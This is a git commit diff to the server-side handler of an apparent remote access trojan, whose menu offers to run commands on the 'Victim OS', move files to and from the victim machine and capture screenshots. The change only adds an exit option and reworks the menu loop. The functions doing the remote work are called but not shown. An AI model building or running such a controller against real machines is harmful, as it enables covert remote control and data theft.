6ebf1efb60c61813ca43b87d69a7cacd7f9bcd8a
Debjeet Banerjee <debjeetbanerjee06042001@gmail.com>
2020-12-27 01:18:25 +0530

    Update serverconnectionhandler.py

--- Server/serverconnectionhandler.py
+++ Server/serverconnectionhandler.py
@@ -16,41 +16,42 @@ def show_options():
     print("[1] Run Command On Victiom OS")
     print("[2] Upload File To Victim Machine")
     print("[3] Download File From Victim Machine")
-    print("[4] Capture Screenshot", end = "\n\n")
+    print("[4] Capture Screenshot")
+    print("[5] Exit", end = "\n\n")
 
     
 # handle user choice and call appropriate functions to perform the respective tasks
 def serverhandler(my_socket):
      print("[+] Handling Server Side Connections")
      print("")
-     show_options()
      while True :
-         ch = input("[+] Select Your Options :")
-         my_socket.send_data(ch)
-         if ch == "1" or ch == "01":
-             print("[+] Running Commands On Victim")
-             send_commands(my_socket)   # Send System Commands
-             
-         elif ch == "2" or ch == "02":
-             print ("[+] Uploading Files To Victim")
-             # upload files to the victim machine
-             upload_file(my_socket)
-
-         elif ch == "3" or ch == "03":
-              # Download files from victim
-              receive_file_folder(my_socket)
+        show_options()
+        ch = input("[+] Select Your Options :")
+        my_socket.send_data(ch)
+        if ch == "1" or ch == "01":
+            print("[+] Running Commands On Victim")
+            send_commands(my_socket)   # Send System Commands
          
-         elif ch =="4" or ch == "04":
-              capture_screenshot(my_socket)
+        elif ch == "2" or ch == "02":
+            print ("[+] Uploading Files To Victim")
+            # upload files to the victim machine
+            upload_file(my_socket)
 
-         elif ch == "exit" or ch == "quit":
-             break
-         
-         else :
-             print ("[+] Wrong Option")
-             print("")
-             show_options()
-             continue
+        elif ch == "3" or ch == "03":
+            # Download files from victim
+            receive_file_folder(my_socket)
+
+        elif ch =="4" or ch == "04":
+            capture_screenshot(my_socket)
+
+        elif ch == "exit" or ch == "quit" or ch =="5":
+            break
+
+        else :
+            print ("[+] Wrong Option")
+            print("")
+            show_options()
+            continue
 
 # get output of commands executed on Victim/Client
 def send_commands(my_socket):
